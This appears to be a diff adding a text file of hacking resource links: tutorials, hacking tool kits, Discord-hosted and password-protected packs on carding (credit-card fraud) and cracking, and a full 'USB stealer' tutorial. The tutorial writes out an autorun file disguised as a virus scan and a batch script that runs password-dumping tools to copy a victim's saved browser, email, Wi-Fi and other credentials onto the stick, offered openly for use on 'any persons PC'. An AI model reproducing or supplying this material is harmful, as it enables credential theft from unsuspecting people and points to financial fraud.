@@ -1,0 +1,69 @@
+https://www.youtube.com/watch?v=AEqupUoKmSw
+https://www.youtube.com/watch?v=24fHLWXGS-M - Web Hacking
+https://www.youtube.com/watch?v=BRZq5EVQqhg&list=PLMB3ddm5Yvh3gf_iev78YP5EPzkA3nPdL - Reverse Engineering
+https://www.youtube.com/watch?v=lZAoFs75_cs - Linux
+https://www.youtube.com/watch?v=u9dBGWVwMMA - Phishing
+(Since this framework local hosts the site I advice you to do this on RDP, i personally use https://onworks.net/)
+https://www.youtube.com/watch?v=Cn3T9hbJyXg&list=PLamOPtBV1e_IJ6fp4xnCLLYjW58IHyr6t - Cracking
+https://www.youtube.com/watch?v=3Kq1MIfTWCE - Networking
+https://github.com/seanhobeck/mono_hack_tutorial
+https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md
+https://www.youtube.com/watch?v=YkZBsiQj5lc
+https://www.youtube.com/watch?v=lZAoFs75_cs
+hindi for any indians https://www.youtube.com/watch?v=7yqCq8P2SRc
+https://www.youtube.com/watch?v=lZAoFs75_cs
+https://github.com/Manisso/fsociety
+https://github.com/unkn0wnh4ckr/hackers-tool-kit
+https://github.com/pratannaimjoi/hackers-tool-kit
+https://github.com/Manisso/fsociety
+https://github.com/unkn0wnh4ckr/hackers-tool-kit
+https://github.com/JuanBenitezDev/fsociety-1
+https://github.com/pratannaimjoi/hackers-tool-kit
+https://github.com/1522402210/fsociety-A-Penetration-Testing-Framework
+https://www.youtube.com/watch?v=YkZBsiQj5lc
+https://cdn.discordapp.com/attachments/653519497717874688/714247105564115054/TutorialDumping-HQ-Combo-Ninja.txt
+https://cdn.discordapp.com/attachments/715359844416356422/715376337031790592/Full-Karding-Tut-2020.txt
+https://cdn.discordapp.com/attachments/715359844416356422/715378453549154304/g2a-karding.txt
+https://cdn.discordapp.com/attachments/719502302922276955/726044616603861032/Advance_cracking_course.txt
+BIGGEST PACK OF CARDING INCLUDE EARNING METHODS AND SOME VIDEO
+TUTORIALS == https://drive.google.com/file/d/1qfvgk7C3sP3KWoH-iHGG2EHNoCaWisIg/edit PASSWORD= abcd1234
+https://www.youtube.com/watch?v=lZAoFs75_cs
+
+HOW TO MAKE A USB STEALER
+Basically with a functional stealer you can plug it into any persons PC and steal all their saved
+passwords, etc.
+No need for Hosting,Software,Crypting
+TUTORIAL:
+open notepad/wordpad
+type:
+[autorun]
+open=launch.bat
+ACTION= Perform a Virus Scan
+save this as AUTORUN.inf
+open a new notepad/wordpad document
+type:
+start mspass.exe /stext mspass.txt
+start mailpv.exe /stext mailpv.txt
+start iepv.exe /stext iepv.txtstart pspv.exe /stext pspv.txt
+start PasswordFox.exe /stext passwordfox.txt
+start OperaPassView.exe /stext OperaPassView.txt
+start ChromePass.exe /stext ChromePass.txt
+start Dialupass.exe /stext Dialupass.txt
+start netpass.exe /stext netpass.txt
+start WirelessKeyView.exe /stext WirelessKeyView.txt
+start BulletsPassView.exe /stext BulletsPassView.txt
+start VNCPassView.exe /stext VNCPassView.txt
+start OpenedFilesView.exe /stext OpenedFilesView.txt
+start ProduKey.exe /stext ProduKey.txt
+start USBDeview.exe /stext USBDeview.txt
+save this as LAUNCH.bat
+copy the autorun and launch file to your USB
+go to http://www.nirsoft.net/ and download the programs named in step 2
+extract the files you downloaded to your desktop and copy all the .exe files to your USB
+remove and re-insert your USB
+click on the option perform a virus scan
+(this is an example, if you want it to say something else go to the autorun file and change it
+:AstolfoSmug5: )
+go to my computer—-> USB DRIVE and open it
+you will now see some text files, if you open them you will see usernames and passwords
+NOTICE: this only recovers passwords that have once been saved on your computer!
